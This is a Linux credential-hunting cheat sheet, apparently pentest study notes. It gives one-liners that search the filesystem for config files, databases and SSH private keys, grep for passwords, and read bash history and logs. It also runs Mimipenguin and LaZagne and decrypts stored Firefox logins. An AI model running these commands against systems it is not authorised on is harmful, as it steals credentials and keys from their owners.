# Configuration Files
```shell
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
# Credentials in Configuration Files
```shell
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
# Databases
```shell
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
# Notes
```shell
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
# Scripts
```shell
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
# Cronjobs
```shell
cat /etc/crontab 
```
```shell
ls -la /etc/cron.*/
```
# SSH Keys
##### SSH Private Keys
```shell
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```
#### SSH Public Keys
```shell
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
```
# History
#### Bash History
```shell
tail -n5 /home/*/.bash*
```
# Logs
```shell
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
# Memory and Cache
#### Memory - Mimipenguin
```shell
sudo python3 mimipenguin.py
```
```shell
sudo bash mimipenguin.sh 
```
#### Memory - LaZagne
```shell
sudo python2.7 laZagne.py all
```
# Browsers
#### Firefox Stored Credentials
```shell
ls -l .mozilla/firefox/ | grep default 
```
```shell
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```
The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, `Firefox Decrypt 0.7.0` with Python 2 must be used.
#### Decrypting Firefox Credentials
```shell
python3.9 firefox_decrypt.py
```
#### Browsers - LaZagne
```shell
python3 laZagne.py browsers
```
